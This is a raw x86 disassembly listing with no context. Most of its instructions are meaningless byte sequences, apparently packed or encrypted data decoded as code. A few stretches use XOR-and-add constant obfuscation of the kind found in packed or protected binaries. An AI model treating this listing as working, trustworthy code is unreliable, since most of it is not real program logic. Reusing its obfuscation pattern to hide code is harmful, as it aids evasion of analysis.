  40c343:	bnd jns 0x40c2ee
  40c346:	lahf   
  40c347:	icebp  
  40c348:	sub    eax,0x995400fd
  40c34d:	push   ecx
  40c34e:	push   0x75
  40c350:	div    DWORD PTR [eax+ebx*4]
  40c353:	sub    BYTE PTR [edx+edi*1+0x7a69c822],0x7c
  40c35b:	ds cdq 
  40c35d:	cwde   
  40c35e:	add    BYTE PTR [edx],dh
  40c360:	fdiv   st,st(0)
  40c362:	test   DWORD PTR [ebp+edx*4+0x5c],ebp
  40c366:	push   cs
  40c367:	aas    
  40c368:	in     al,0x4c
  40c36a:	out    0x45,eax
  40c36c:	inc    esi
  40c36d:	adc    ecx,DWORD PTR [ebx+0x2a45d6d3]
  40c373:	adc    bl,BYTE PTR [esi-0x5e3fb37c]
  40c379:	aas    
  40c37a:	outs   dx,BYTE PTR ds:[esi]
  40c37b:	dec    esp
  40c37c:	xchg   ch,al
  40c37e:	inc    edi
  40c37f:	retf   
  40c380:	hlt    
  40c381:	pop    ax
  40c383:	jae    0x40c3b9
  40c385:	or     ecx,DWORD PTR [edx-0x7f]
  40c388:	add    DWORD PTR [edx],edi
  40c38a:	imul   DWORD PTR [ebx-0x41]
  40c38d:	add    DWORD PTR [edx+edi*2+0x76],ebx
  40c391:	cld    
  40c392:	add    DWORD PTR [ebx],edx
  40c394:	pop    ds
  40c395:	sub    edx,DWORD PTR [ebp+0x33]
  40c398:	cmp    ch,BYTE PTR [ebx-0x3a04af3f]
  40c39e:	xor    ch,al
  40c3a0:	or     eax,0x7cd5ace
  40c3a5:	lea    ebx,[edi]
  40c3a7:	out    0x4,eax
  40c3a9:	xchg   DWORD PTR [ebp+0x1f],eax
  40c3ac:	stc    
  40c3ad:	xchg   esi,eax
  40c3ae:	xchg   ebx,eax
  40c3af:	dec    eax
  40c3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3b1:	scas   al,BYTE PTR es:[edi]
  40c3b2:	sbb    BYTE PTR [ebp-0x611ad666],bh
  40c3b8:	mov    al,ds:0x3c1cd1c
  40c3bd:	mov    ch,0x10
  40c3bf:	pcmpeqb mm6,QWORD PTR [eax-0x641f8424]
  40c3c6:	sub    eax,0xac18043
  40c3cb:	icebp  
  40c3cc:	mov    esi,0x3fc53745
  40c3d1:	out    dx,eax
  40c3d2:	fistp  WORD PTR [esi+0x2e]
  40c3d5:	add    DWORD PTR [edi+0x7979753f],0x1c
  40c3dc:	outs   dx,DWORD PTR ds:[esi]
  40c3dd:	idiv   DWORD PTR [edi+0x7b236bd]
  40c3e3:	and    dl,BYTE PTR [ecx+0x458b813f]
  40c3e9:	cld    
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    DWORD PTR [eax+0x14036ed2],cl
  40c44b:	cmp    BYTE PTR [esi+0x7e],0x38
  40c44f:	jl     0x40c4cf
  40c451:	jle    0x40c448
  40c453:	inc    ebx
  40c454:	call   FWORD PTR [ebp-0x67935215]
  40c45a:	mov    esp,0x7805fe56
  40c45f:	sbb    al,BYTE PTR [esi]
  40c461:	fsub   st(2),st
  40c463:	mov    eax,ds:0x5f5b006e
  40c468:	and    dl,bl
  40c46a:	stc    
  40c46b:	mov    ss,WORD PTR [esi]
  40c46d:	outs   dx,BYTE PTR ds:[esi]
  40c46e:	mov    edx,DWORD PTR [ecx+ebp*1]
  40c471:	push   ds
  40c472:	in     eax,0x72
  40c474:	sub    esi,ebp
  40c476:	mov    ah,0x9a
  40c478:	fucom  st(1)
  40c47a:	pop    eax
  40c47b:	shr    eax,cl
  40c47d:	ins    BYTE PTR es:[edi],dx
  40c47e:	rol    BYTE PTR [eax],0x1
  40c481:	xlat   BYTE PTR ds:[ebx]
  40c482:	xchg   esp,eax
  40c483:	icebp  
  40c484:	call   0x156c1d5b
  40c489:	jbe    0x40c4b3
  40c48b:	adc    DWORD PTR [edi],esi
  40c48d:	mov    BYTE PTR [edi],ch
  40c48f:	(bad)  
  40c490:	add    eax,0xffffffd1
  40c493:	dec    eax
  40c494:	ds xor esp,ebx
  40c497:	stc    
  40c498:	call   0xab77:0x34668dd5
  40c49f:	pop    esi
  40c4a0:	cmp    edx,0x78
  40c4a3:	sub    al,0x45
  40c4a5:	std    
  40c4a6:	jmp    0x40c492
  40c4a8:	test   bl,bh
  40c4aa:	retf   0x90f2
  40c4ad:	mov    ds,WORD PTR [ebx+0x5a]
  40c4b0:	mov    WORD PTR [eax],ds
  40c4b2:	jmp    0x1c523bf
  40c4b7:	jbe    0x40c506
  40c4b9:	mov    ds:0xf41eb7e1,eax
  40c4be:	sub    eax,0x2cfdc8b3
  40c4c3:	mov    bh,0x87
  40c4c5:	cmp    BYTE PTR [eax-0x69],al
  40c4c8:	add    al,0x36
  40c4ca:	sbb    dl,dh
  40c4cc:	mov    DWORD PTR [ebp+0x67],ebp
  40c4cf:	or     DWORD PTR [esi],ebx
  40c4d1:	imul   esp,DWORD PTR [eax],0xb054fb23
  40c4d7:	leave  
  40c4d8:	test   al,0x94
  40c4da:	hlt    
  40c4db:	sub    DWORD PTR [edx],0x225b60b7
  40c4e1:	xor    ebp,DWORD PTR [ecx]
  40c4e3:	lock leave 
  40c4e5:	adc    cl,BYTE PTR [esi]
  40c4e7:	jns    0x40c515
  40c4e9:	or     al,0x1c
  40c4eb:	pop    edx
  40c4ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ed:	pop    esp
  40c4ee:	sahf   
  40c4ef:	add    ecx,DWORD PTR [esi+edx*2+0x4d]
  40c4f3:	sbb    DWORD PTR [edx-0x29],esi
  40c4f6:	xchg   ecx,eax
  40c4f7:	rol    BYTE PTR [ecx+0xab79b8e],0x28
  40c4fe:	inc    esp
  40c4ff:	rcr    ebx,1
  40c501:	xor    ebp,esp
  40c503:	test   eax,0xf485eb04
  40c508:	and    BYTE PTR [edx+0x2fd9ca78],bh
  40c50e:	clc    
  40c50f:	xor    al,BYTE PTR [edx+ebp*2+0x3c6aa224]
  40c516:	xor    BYTE PTR [ecx-0x4d],0xa8
  40c51a:	fiadd  WORD PTR ds:0x9f58e6d8
  40c520:	shl    DWORD PTR fs:[eax],cl
  40c523:	adc    eax,esi
  40c525:	gs inc esp
  40c527:	or     eax,0xde0be924
  40c52c:	pop    ebp
  40c52d:	pop    ebx
  40c52e:	xor    BYTE PTR [ebx],0x9c
  40c531:	fwait
  40c532:	sub    eax,0x6b0aae16
  40c537:	add    cl,BYTE PTR [ebx+0x200724d]
  40c53d:	div    bh
  40c53f:	int    0x38
  40c541:	mov    ebx,0x4e8a0cfa
  40c546:	dec    DWORD PTR [edx+0x34]
  40c549:	das    
  40c54a:	inc    edx
  40c54b:	outs   dx,DWORD PTR ds:[esi]
  40c54c:	fwait
  40c54d:	and    eax,0xad8eb3cd
  40c552:	push   es
  40c553:	retf   
  40c554:	dec    esi
  40c555:	aam    0x82
  40c557:	es adc al,0x8
  40c55a:	inc    BYTE PTR [ebx]
  40c55c:	fwait
  40c55d:	pop    esp
  40c55e:	test   DWORD PTR ds:0x345a98b3,0x4108dd00
  40c568:	mov    ebp,0xe75d73de
  40c56d:	addr16 dec esp
  40c56f:	mov    ah,0xc7
  40c571:	mov    bh,0xa6
  40c573:	pop    esp
  40c574:	mov    al,0x8
  40c576:	adc    ecx,esp
  40c578:	(bad)  
  40c579:	jno    0x40c56f
  40c57b:	scas   al,BYTE PTR es:[edi]
  40c57c:	cmp    eax,0xdfdfb55c
  40c581:	jg     0x40c58d
  40c583:	push   ss
  40c584:	test   al,0xeb
  40c586:	mov    fs,edi
  40c588:	(bad)  
  40c589:	cmp    DWORD PTR [ecx],0x50
  40c58c:	jne    0x40c570
  40c58e:	pusha  
  40c58f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40c591:	aas    
  40c592:	das    
  40c593:	pushf  
  40c594:	nop
  40c595:	in     al,0xa1
  40c597:	paddq  mm7,QWORD PTR [esi-0x6ca9019a]
  40c59e:	mov    dl,0xce
  40c5a0:	loop   0x40c592
  40c5a2:	sub    eax,0xd0aa7b63
  40c5a7:	mov    WORD PTR [eax+0x2b],?
  40c5aa:	mov    DWORD PTR ds:0xc23384c0,edx
  40c5b0:	and    al,0xbb
  40c5b2:	aas    
  40c5b3:	sub    BYTE PTR [ecx],ah
  40c5b5:	xor    al,0x4c
  40c5b7:	sbb    esi,DWORD PTR [ecx-0x5d]
  40c5ba:	jge    0x40c5f7
  40c5bc:	aas    
  40c5bd:	lods   al,BYTE PTR ds:[esi]
  40c5be:	jle    0x40c5d6
  40c5c0:	and    ebx,ecx
  40c5c2:	mov    ah,0xb1
  40c5c4:	mov    ecx,0xa26877ca
  40c5c9:	mov    edi,0xeb2f7411
  40c5ce:	cmc    
  40c5cf:	pop    esi
  40c5d0:	pop    ebp
  40c5d1:	push   cs
  40c5d2:	fst    QWORD PTR [edi]
  40c5d4:	ret    
  40c5d5:	mov    al,ds:0xb629a569
  40c5da:	mov    ds:0x1f4b96e,eax
  40c5df:	push   ds
  40c5e0:	jb     0x40c5c5
  40c5e2:	ficom  WORD PTR [edx-0x2]
  40c5e5:	stos   DWORD PTR es:[edi],eax
  40c5e6:	jp     0x40c5be
  40c5e8:	sar    DWORD PTR [esi-0x53],cl
  40c5eb:	push   cs
  40c5ec:	pop    esp
  40c5ed:	xchg   ebx,eax
  40c5ee:	and    eax,0x4c0349a2
  40c5f3:	dec    ebp
  40c5f4:	dec    ebx
  40c5f5:	xchg   esi,eax
  40c5f6:	and    eax,0x615a8d85
  40c5fb:	sbb    esi,DWORD PTR [edi-0x695a9d81]
  40c601:	hlt    
  40c602:	bound  eax,QWORD PTR [esi+0x3c4db469]
  40c608:	jge    0x40c630
  40c60a:	jmp    0xc8869fde
  40c60f:	add    BYTE PTR [edx],ch
  40c611:	ror    BYTE PTR [esp+edi*8+0x1767c31e],1
  40c618:	scas   al,BYTE PTR es:[edi]
  40c619:	icebp  
  40c61a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c61b:	xor    dl,BYTE PTR [eax+ebx*2]
  40c61e:	push   edx
  40c61f:	hlt    
  40c620:	mov    BYTE PTR [eax+0x38477234],dl
  40c626:	mov    dh,0x76
  40c628:	ficom  DWORD PTR [ebp-0x12b53e69]
  40c62e:	aaa    
  40c62f:	es neg al
  40c632:	cvtpi2ps xmm3,QWORD PTR [ebx+0x5731c87a]
  40c639:	xchg   ebp,eax
  40c63a:	mov    ch,0xed
  40c63c:	out    0xd2,eax
  40c63e:	stos   DWORD PTR es:[edi],eax
  40c63f:	mov    ebx,0x7d7a09f6
  40c644:	mov    eax,0xc44a10b2
  40c649:	in     al,dx
  40c64a:	ds dec ebx
  40c64c:	xor    al,0x1f
  40c64e:	dec    edi
  40c64f:	jmp    0x592e:0xbe31191a
  40c656:	mov    eax,ds:0xc79b28d
  40c65b:	inc    edx
  40c65c:	dec    edx
  40c65d:	stos   DWORD PTR es:[edi],eax
  40c65e:	test   cl,cl
  40c660:	out    0x7b,eax
  40c662:	cmp    al,0xf1
  40c664:	jmp    0x40c5f0
  40c666:	mov    ecx,0x92f3c337
  40c66b:	hlt    
  40c66c:	xchg   edx,eax
  40c66d:	mov    edi,0xe4f06dcf
  40c672:	test   DWORD PTR [esi+0x7b1a15eb],edx
  40c678:	sub    eax,0x2aa3b2de
  40c67d:	ds ret 
  40c67f:	retf   
  40c680:	sbb    dl,BYTE PTR [edx-0x698fdcd3]
  40c686:	repz daa 
  40c688:	mov    ebx,0xe0d98c4b
  40c68d:	outs   dx,BYTE PTR ds:[esi]
  40c68e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c68f:	or     BYTE PTR [eax+0x52ef7aa],dl
  40c695:	bound  ebp,QWORD PTR [ecx+edi*2+0x32729bbe]
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x2a1b653f],dl
  40c6de:	stos   DWORD PTR es:[edi],eax
  40c6df:	xor    esi,ebx
  40c6e1:	cmp    BYTE PTR [esi+0x7e],0x38
  40c6e5:	jl     0x40c765
  40c6e7:	jle    0x40c760
  40c6e9:	loopne 0x40c743
  40c6eb:	xor    al,0x5c
  40c6ee:	jne    0x40c6e6
  40c6f0:	ins    BYTE PTR es:[edi],dx
  40c6f1:	jbe    0x40c73d
  40c6f3:	clc    
  40c6f4:	jmp    0x8e513e59
  40c6f9:	(bad)  
  40c6fb:	shl    DWORD PTR [ecx-0x52],cl
  40c6fe:	ror    bl,cl
  40c700:	xchg   ebx,eax
  40c701:	push   ecx
  40c702:	jecxz  0x40c6a0
  40c704:	ins    DWORD PTR es:[edi],dx
  40c705:	inc    ebx
  40c706:	sbb    al,0x8d
  40c708:	fnstsw WORD PTR [esi-0x70]
  40c70b:	mov    WORD PTR [ebx-0x4e],cs
  40c70e:	fprem  
  40c710:	mov    al,ds:0x12a766a7
  40c715:	pop    ss
  40c716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c717:	out    dx,eax
  40c718:	and    al,0x1f
  40c71a:	in     al,0x54
  40c71c:	and    edi,0xffffffd5
  40c71f:	xchg   esi,eax
  40c720:	js     0x40c748
  40c722:	ret    
  40c723:	call   0x9dfc:0x9b7bc5c
  40c72a:	cld    
  40c72b:	pop    ebx
  40c72c:	test   BYTE PTR [ecx-0x1d6a2b87],dl
  40c732:	das    
  40c733:	retf   0x12d7
  40c736:	xchg   esp,eax
  40c737:	inc    esi
  40c738:	outs   dx,DWORD PTR ss:[esi]
  40c73a:	sub    DWORD PTR [ebp-0x5a],edi
  40c73d:	push   es
  40c73e:	int    0xfd
  40c740:	mov    al,ds:0x36c838e8
  40c745:	or     dl,BYTE PTR [ebx-0x1d6e673f]
  40c74b:	cs pop edx
  40c74d:	jmp    0x7e74245f
  40c752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c753:	pop    edi
  40c754:	pop    ebx
  40c755:	jbe    0x40c71f
  40c757:	dec    edx
  40c758:	xchg   edx,eax
  40c759:	mov    bh,0x29
  40c75b:	adc    edx,DWORD PTR [edx+edx*2-0x70635447]
  40c762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c763:	out    0x7c,eax
  40c765:	sub    eax,0x88e7cab1
  40c76a:	jne    0x40c7bb
  40c76c:	dec    edi
  40c76d:	pushaw 
  40c76f:	pop    ebx
  40c770:	mov    edi,0x7f03f7da
  40c775:	adc    al,0x73
  40c777:	daa    
  40c778:	or     ebx,DWORD PTR [ebp+0x62]
  40c77b:	lea    ecx,[edi+0x62]
  40c77e:	test   al,0x61
  40c780:	xor    BYTE PTR [ebp+0x4e7357b],ch
  40c786:	outs   dx,DWORD PTR ds:[esi]
  40c787:	adc    ebp,DWORD PTR [edx-0x64b5bf69]
  40c78d:	mov    ch,BYTE PTR [ebx]
  40c78f:	sub    DWORD PTR [edx-0x3a52e051],edx
  40c795:	inc    esi
  40c796:	stos   DWORD PTR es:[edi],eax
  40c797:	add    eax,0x20534b62
  40c79c:	aas    
  40c79d:	sub    al,0x3
  40c79f:	rol    DWORD PTR [eax+0x7732e4c3],cl
  40c7a5:	data16 adc al,0x71
  40c7a8:	sbb    al,0x14
  40c7aa:	enter  0x5544,0x54
  40c7ae:	push   eax
  40c7af:	rol    BYTE PTR [edx+0x5a],cl
  40c7b2:	push   esi
  40c7b3:	sbb    al,0x91
  40c7b5:	sbb    BYTE PTR [ebx-0x58],dl
  40c7b8:	mov    bl,BYTE PTR [esi+0x5d2b38c2]
  40c7be:	mov    esi,0xaefb1e47
  40c7c3:	adc    esp,DWORD PTR [edi-0x6]
  40c7c6:	retf   0xcd92
  40c7c9:	pop    ecx
  40c7ca:	jl     0x40c7bc
  40c7cc:	push   ebx
  40c7cd:	mov    al,ds:0xbeb80c95
  40c7d2:	lahf   
  40c7d3:	inc    ch
  40c7d5:	mov    al,0x5b
  40c7d7:	fnstcw WORD PTR [esi+0x65be423b]
  40c7dd:	arpl   WORD PTR [edx],bp
  40c7df:	ins    DWORD PTR es:[edi],dx
  40c7e0:	xor    eax,0xaf4120a2
  40c7e5:	sbb    esp,esp
  40c7e7:	pop    eax
  40c7e8:	sub    BYTE PTR [ecx-0x56],dl
  40c7eb:	nop
  40c7ec:	adc    BYTE PTR [bx],bl
  40c7ef:	sahf   
  40c7f0:	push   edi
  40c7f1:	mov    al,0x15
  40c7f3:	inc    edx
  40c7f4:	lods   eax,DWORD PTR ds:[esi]
  40c7f5:	(bad)  
  40c7f7:	mov    al,0xe4
  40c7f9:	xchg   edx,eax
  40c7fa:	call   FWORD PTR [eax-0x5a]
  40c7fd:	inc    eax
  40c7fe:	dec    eax
  40c7ff:	clc    
  40c800:	(bad)  
  40c801:	scas   al,BYTE PTR es:[edi]
  40c802:	push   0xcc4225ce
  40c807:	test   eax,0x7668e0b2
  40c80c:	jae    0x40c882
  40c80e:	jle    0x40c85c
  40c810:	hlt    
  40c811:	daa    
  40c812:	ror    DWORD PTR [esi+0x66],cl
  40c815:	pop    edx
  40c816:	sahf   
  40c817:	sti    
  40c818:	loope  0x40c866
  40c81a:	fisub  WORD PTR [eax]
  40c81c:	test   eax,0x2670a240
  40c821:	push   esi
  40c822:	xor    eax,0xa3564d6c
  40c827:	push   0x4f
  40c829:	rol    BYTE PTR [edx+0x7d],1
  40c82c:	sub    dl,0xcc
  40c82f:	ins    DWORD PTR es:[edi],dx
  40c830:	jp     0x40c7e6
  40c832:	xchg   edx,eax
  40c833:	push   esi
  40c834:	adc    bh,bl
  40c836:	or     ah,BYTE PTR [esi-0x33091684]
  40c83c:	sti    
  40c83d:	js     0x40c7df
  40c83f:	push   edi
  40c840:	cwde   
  40c841:	sar    DWORD PTR [eax],0xe4
  40c844:	jae    0x40c7ec
  40c846:	sahf   
  40c847:	add    ch,BYTE PTR [ecx]
  40c849:	nop
  40c84a:	jmp    0x40c8cb
  40c84c:	cmp    edx,eax
  40c84e:	mov    WORD PTR [edi-0x28e839c3],?
  40c854:	rcr    BYTE PTR [eax+0x6203f79e],1
  40c85a:	paddw  mm1,mm2
  40c85d:	mov    al,ds:0xdb1fd577
  40c862:	adc    al,0xb
  40c864:	mov    eax,ds:0xcea462f4
  40c869:	popf   
  40c86a:	hlt    
  40c86b:	pop    ss
  40c86c:	sti    
  40c86d:	mul    DWORD PTR [ebx]
  40c86f:	and    al,0xa0
  40c871:	push   es
  40c872:	inc    ecx
  40c873:	fwait
  40c874:	pop    ecx
  40c875:	mov    edi,0x1e0ca583
  40c87a:	ret    
  40c87b:	mov    edi,0x14078725
  40c880:	cdq    
  40c881:	sbb    DWORD PTR [ecx-0x44],ebp
  40c884:	sub    DWORD PTR [esi+0x4c188a0a],edx
  40c88a:	pop    ebx
  40c88b:	mov    eax,0x623216e5
  40c890:	cmp    al,0x8d
  40c892:	out    dx,al
  40c893:	push   0x54
  40c895:	cwde   
  40c896:	jle    0x40c818
  40c898:	aad    0x3f
  40c89a:	ins    DWORD PTR es:[edi],dx
  40c89b:	or     BYTE PTR [ebx-0x47],ch
  40c89e:	fsubr  QWORD PTR [eax]
  40c8a0:	sbb    cl,al
  40c8a2:	mov    ds,ebx
  40c8a4:	dec    ebp
  40c8a5:	in     al,dx
  40c8a6:	add    DWORD PTR [ecx+0x44],esi
  40c8a9:	xor    esi,ebp
  40c8ab:	push   ebp
  40c8ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8ad:	popf   
  40c8ae:	clc    
  40c8af:	gs mov ebx,ecx
  40c8b2:	inc    esp
  40c8b3:	call   0x1f287970
  40c8b8:	dec    ebp
  40c8b9:	ret    
  40c8ba:	adc    ecx,DWORD PTR [edx-0x3c]
  40c8bd:	shl    BYTE PTR [esi+0x7b],0x6f
  40c8c1:	sub    edx,DWORD PTR [ebx-0x4c]
  40c8c4:	xchg   ecx,eax
  40c8c5:	adc    eax,0x4a5517e3
  40c8ca:	mov    esi,0xbd1300ca
  40c8cf:	jmp    0x40c904
  40c8d1:	ror    BYTE PTR [edi+eax*1+0x1f],1
  40c8d5:	retfw  
  40c8d7:	aas    
  40c8d8:	inc    eax
  40c8d9:	or     ah,BYTE PTR ds:0x29bad97c
  40c8df:	or     edx,DWORD PTR [esi]
  40c8e1:	cmp    eax,0x6aa3c7a7
  40c8e6:	add    esp,ebp
  40c8e8:	mov    al,ds:0xb31d2c70
  40c8ed:	jbe    0x40c8bf
  40c8ef:	adc    al,0x23
  40c8f1:	in     eax,0x4f
  40c8f3:	pop    eax
  40c8f4:	add    al,0x2d
  40c8f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8f7:	std    
  40c8f8:	mov    eax,0x2a028593
  40c8fd:	fadd   QWORD PTR [ecx-0x40d654f5]
  40c903:	push   cs
  40c904:	lods   al,BYTE PTR ds:[esi]
  40c905:	mov    bl,BYTE PTR [edx]
  40c907:	mov    ah,0x37
  40c909:	xchg   ebx,eax
  40c90a:	push   esi
  40c90b:	fwait
  40c90c:	add    al,0x51
  40c90e:	jle    0x40c8a7
  40c910:	bndldx (bad),ds:0xd6883100
  40c917:	into   
  40c918:	inc    edx
  40c919:	addr16 das 
  40c91b:	rcl    DWORD PTR [edi-0x61],0x79
  40c91f:	pop    edx
  40c920:	cmp    DWORD PTR [edx],0xffffffe4
  40c923:	or     ebp,DWORD PTR [ecx]
  40c925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c926:	inc    edi
  40c927:	sbb    bl,BYTE PTR [ecx+0x14]
  40c92a:	(bad)  
  40c92b:	bound  esp,QWORD PTR [ecx]
  40c92d:	mov    ds:0x3314558b,al
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    ecx,ebp
  40c945:	xchg   edi,eax
  40c946:	mov    DWORD PTR [eax+ebx*4+0x387e7e8e],edx
  40c94d:	jl     0x40c9cd
  40c94f:	jle    0x40c914
  40c951:	mov    ds:0x2c47de4,al
  40c956:	inc    ebp
  40c957:	lahf   
  40c958:	mov    ch,0x94
  40c95a:	jmp    0x306a:0xe0f9c5b1
  40c961:	cmp    al,ch
  40c963:	jecxz  0x40c9c5
  40c965:	stc    
  40c966:	outs   dx,DWORD PTR ds:[esi]
  40c967:	rcl    BYTE PTR [esi-0x2f],1
  40c96a:	retf   0xb1c7
  40c96d:	test   eax,0xb8c63cec
  40c972:	mov    ds:0x8c320441,al
  40c977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c978:	fmulp  st(5),st
  40c97a:	dec    ebx
  40c97b:	and    al,0xfa
  40c97d:	sub    eax,ebx
  40c97f:	jl     0x40c928
  40c981:	ret    
  40c982:	pop    edi
  40c983:	(bad)  
  40c984:	mov    WORD PTR [ecx+0x4d9c8b86],fs
  40c98a:	scas   eax,DWORD PTR es:[edi]
  40c98b:	sub    ah,ch
  40c98d:	sbb    DWORD PTR [ecx],edx
  40c98f:	shl    BYTE PTR [eax-0x251e89a6],0x60
  40c996:	xor    esi,DWORD PTR [edx]
  40c998:	sti    
  40c999:	mov    bl,0xdf
  40c99b:	inc    eax
  40c99c:	(bad)  [ebx+0x7acb072]
  40c9a2:	mov    esp,DWORD PTR [eax]
  40c9a4:	jecxz  0x40c9e5
  40c9a6:	(bad)  
  40c9a8:	xor    DWORD PTR [edx+0x3b],ecx
  40c9ab:	retf   0x919c
  40c9ae:	mov    al,0x6a
  40c9b0:	dec    ebp
  40c9b1:	stos   DWORD PTR es:[edi],eax
  40c9b2:	adc    eax,0x2487e15f
  40c9b7:	push   ecx
  40c9b8:	ins    DWORD PTR es:[edi],dx
  40c9b9:	std    
  40c9ba:	popf   
  40c9bb:	cmp    edx,ecx
  40c9bd:	int    0xfb
  40c9bf:	rol    ah,0xfa
  40c9c2:	jb     0x40ca35
  40c9c4:	(bad)  
  40c9c5:	lea    esp,[edx-0x5b]
  40c9c8:	gs sbb esi,eax
  40c9cb:	pop    eax
  40c9cc:	add    al,0x25
  40c9ce:	clc    
  40c9cf:	or     al,0xe9
  40c9d1:	ret    0x3d14
  40c9d4:	shr    DWORD PTR [ecx-0x62],1
  40c9d7:	cmp    dl,BYTE PTR [edx-0x6c121d95]
  40c9dd:	out    dx,al
  40c9de:	das    
  40c9df:	in     al,0xe7
  40c9e1:	xchg   esp,eax
  40c9e2:	call   FWORD PTR [ecx+0x29]
  40c9e5:	push   ds
  40c9e6:	pop    ebp
  40c9e7:	add    cl,ch
  40c9e9:	sbb    ch,BYTE PTR [ecx-0x23]
  40c9ec:	clc    
  40c9ed:	sbb    al,bh
  40c9ef:	and    bl,BYTE PTR [ecx]
  40c9f1:	add    al,0x8d
  40c9f3:	mov    ebp,0xa522598a
  40c9f8:	out    dx,eax
  40c9f9:	iret   
  40c9fa:	gs (bad) 
  40c9fc:	mov    eax,ds:0x8ae6901d
  40ca01:	in     al,dx
  40ca02:	fwait
  40ca03:	cmp    edi,DWORD PTR [eax-0x12]
  40ca06:	lods   al,BYTE PTR ds:[esi]
  40ca07:	aam    0x72
  40ca09:	dec    ebx
  40ca0a:	popf   
  40ca0b:	clc    
  40ca0c:	jmp    0xe91c23a5
  40ca11:	lahf   
  40ca12:	adc    DWORD PTR [ebx+0x6eb4b95f],edi
  40ca18:	in     eax,0x52
  40ca1a:	jg     0x40ca27
  40ca1c:	xor    al,0xaa
  40ca1e:	inc    edx
  40ca1f:	ins    DWORD PTR es:[edi],dx
  40ca20:	mov    eax,0xf65b10b5
  40ca25:	mov    bh,0x20
  40ca27:	cmc    
  40ca28:	xchg   edi,eax
  40ca29:	inc    ecx
  40ca2a:	dec    esi
  40ca2b:	nop
  40ca2c:	mov    dh,0x8
  40ca2e:	mov    al,ds:0xdd87a761
  40ca33:	cmp    BYTE PTR [edi+edi*2],ah
  40ca36:	jle    0x40c9bf
  40ca38:	jno    0x40ca5d
  40ca3a:	jo     0x40ca0e
  40ca3c:	push   ebx
  40ca3d:	in     al,dx
  40ca3e:	mov    edx,0xef89780b
  40ca43:	das    
  40ca44:	push   edx
  40ca45:	pop    esi
  40ca46:	jp     0x40ca1e
  40ca48:	ja     0x40cab7
  40ca4a:	xor    edx,DWORD PTR [eax-0x36f960f5]
  40ca50:	jb     0x40ca1e
  40ca52:	push   ds
  40ca53:	push   cs
  40ca54:	fimul  DWORD PTR [ebx-0x66bbe727]
  40ca5a:	xor    DWORD PTR [edx+0x14],esi
  40ca5d:	adc    eax,0x3ed416b5
  40ca62:	ja     0x40ca00
  40ca64:	jb     0x40ca62
  40ca66:	test   DWORD PTR [ecx+0x7abd2dff],esp
  40ca6c:	mov    bl,0xe7
  40ca6e:	add    al,0x2
  40ca70:	xor    ebx,DWORD PTR fs:[ecx]
  40ca73:	adc    cl,ah
  40ca75:	push   esp
  40ca76:	mov    edx,0xcab230b1
  40ca7b:	mov    edi,?
  40ca7d:	jp     0x40caf8
  40ca7f:	add    bh,BYTE PTR [esi]
  40ca81:	mov    esi,0x6deddac
  40ca86:	push   edx
  40ca87:	ret    0xe47e
  40ca8a:	sbb    edx,0xb34cf0d2
  40ca90:	pop    es
  40ca91:	xchg   esi,eax
  40ca92:	(bad)  
  40ca93:	mov    ?,WORD PTR [ebx+ebp*2+0x6a64a9ae]
  40ca9a:	outs   dx,DWORD PTR fs:[esi]
  40ca9c:	(bad)  
  40ca9d:	addr16 sahf 
  40ca9f:	jno    0x40cb08
